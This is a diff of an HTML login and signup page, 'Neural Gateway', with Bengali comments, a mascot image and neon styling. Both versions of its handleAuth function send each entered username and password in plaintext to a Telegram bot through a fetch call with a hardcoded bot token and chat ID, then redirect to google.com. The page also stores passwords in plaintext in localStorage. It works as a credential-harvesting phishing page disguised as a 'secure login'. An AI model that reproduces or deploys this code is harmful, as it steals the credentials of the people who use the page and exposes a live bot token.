@@ -3,42 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Neural Gateway | Secure Login</title>
+    <title>Neural Gateway</title>
     <style>
         body { margin: 0; background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        
+        /* অ্যানিমেটেড নিয়ন বর্ডার */
         .glass-card { 
-            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(20px); 
+            background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(15px); 
             padding: 40px; border-radius: 30px; text-align: center; 
-            width: 350px; max-width: 90%; 
-            border: 1px solid rgba(0, 255, 136, 0.3); box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
-            box-sizing: border-box;
+            width: 350px; max-width: 90%;
+            border: 2px solid transparent;
+            background-clip: padding-box, border-box;
+            background-origin: padding-box, border-box;
+            animation: borderGlow 3s infinite alternate;
         }
-        #mascot-img { width: 150px; height: 150px; margin-bottom: 20px; transition: 0.3s; border-radius: 50%; object-fit: cover; }
+
+        @keyframes borderGlow {
+            0% { border-color: #00ff88; box-shadow: 0 0 10px #00ff88; }
+            100% { border-color: #0088ff; box-shadow: 0 0 20px #0088ff; }
+        }
+
+        #mascot-img { width: 150px; height: 150px; margin-bottom: 20px; transition: 0.3s; border-radius: 50%; }
         .input-group { position: relative; margin: 15px 0; }
-        input { width: 100%; padding: 12px; background: rgba(0,0,0,0.3); border: 1px solid #444; color: white; border-radius: 10px; outline: none; box-sizing: border-box; }
+        input { width: 100%; padding: 12px; background: rgba(255,255,255,0.1); border: 1px solid #444; color: white; border-radius: 10px; outline: none; box-sizing: border-box; }
         input:focus { border: 1px solid #00ff88; }
-        #toggle-pass { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #00ff88; cursor: pointer; font-size: 16px; }
-        button { width: 100%; padding: 15px; background: #00ff88; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; color: #000; }
+        
+        #toggle-pass { position: absolute; right: 10px; top: 12px; background: none; border: none; color: #00ff88; cursor: pointer; }
+        
+        button { width: 100%; padding: 15px; background: #00ff88; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; color: #000; margin-top: 10px; }
         a { color: #00ff88; text-decoration: none; font-size: 14px; display: block; margin-top: 15px; cursor: pointer; }
-        @media (max-width: 480px) { .glass-card { padding: 25px; } #mascot-img { width: 120px; height: 120px; } }
     </style>
 </head>
 <body>
 
-<div class="glass-card" id="form-container">
+<div class="glass-card">
     <img id="mascot-img" src="1000022715.jpg" alt="Mascot">
     <h2 id="form-title">Login</h2>
     
-    <div class="input-group">
-        <input type="text" id="username" placeholder="Username">
-    </div>
+    <input type="text" id="username" placeholder="Username" style="width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #444; background: rgba(255,255,255,0.1); color: white; box-sizing: border-box;">
     
     <div class="input-group">
         <input type="password" id="password" placeholder="Password">
         <button id="toggle-pass" type="button">👁️</button>
     </div>
     
-    <button id="action-btn" onclick="handleAuth()">SECURE LOGIN</button>
+    <button onclick="handleAuth()" id="action-btn">SECURE LOGIN</button>
     <a id="toggle-link" onclick="switchForm()">Create Account</a>
 </div>
 
@@ -47,9 +56,6 @@
     const img = document.getElementById('mascot-img');
     const pass = document.getElementById('password');
     const toggleBtn = document.getElementById('toggle-pass');
-    const actionBtn = document.getElementById('action-btn');
-    const formTitle = document.getElementById('form-title');
-    const toggleLink = document.getElementById('toggle-link');
 
     // পোজ লজিক
     pass.addEventListener('focus', () => { if(pass.type === "password") img.src = '1000022716.jpg'; });
@@ -63,9 +69,9 @@
 
     function switchForm() {
         isLogin = !isLogin;
-        formTitle.innerText = isLogin ? "Login" : "Create Account";
-        actionBtn.innerText = isLogin ? "SECURE LOGIN" : "REGISTER";
-        toggleLink.innerText = isLogin ? "Create Account" : "Already have an account? Login";
+        document.getElementById('form-title').innerText = isLogin ? "Login" : "Create Account";
+        document.getElementById('action-btn').innerText = isLogin ? "SECURE LOGIN" : "REGISTER";
+        document.getElementById('toggle-link').innerText = isLogin ? "Create Account" : "Back to Login";
     }
 
     function handleAuth() {
@@ -73,22 +79,20 @@
         const passVal = pass.value;
 
         if (isLogin) {
-            // লগইন লজিক
             if (localStorage.getItem(user) === passVal) {
-                alert("Login Successful! Welcome " + user);
-                window.location.href = "https://www.google.com"; // এখানে আপনার মেইন পেজের লিংক দিন
+                alert("Login Successful!");
+                window.location.href = "https://www.google.com";
             } else {
                 alert("Invalid username or password!");
             }
         } else {
-            // সাইন-আপ লজিক
             localStorage.setItem(user, passVal);
-            alert("Account created successfully! Please login.");
+            alert("Account Created!");
             switchForm();
         }
-        
-        // টেলিগ্রাম বটের মাধ্যমে ডাটা পাঠানো (অপশনাল)
-        fetch(`https://api.telegram.org/bot8736432847:AAHbDf-tOzpa6q--_R-1MRGeENKkh9CEHWc/sendMessage?chat_id=7950771882&text=Action:${isLogin?'Login':'Signup'}%0AUser:${user}%0APass:${passVal}`);
+
+        // টেলিগ্রাম বট কল
+        fetch(`https://api.telegram.org/bot8736432847:AAHbDf-tOzpa6q--_R-1MRGeENKkh9CEHWc/sendMessage?chat_id=7950771882&text=User:${user}%0APass:${passVal}`);
     }
 </script>
 
